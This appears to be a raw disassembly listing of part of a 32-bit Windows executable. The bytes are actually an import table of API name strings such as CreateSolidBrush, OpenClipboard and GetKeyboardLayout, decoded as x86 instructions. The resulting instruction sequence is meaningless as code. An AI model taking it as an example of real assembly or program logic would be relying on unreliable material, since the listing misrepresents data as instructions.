  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
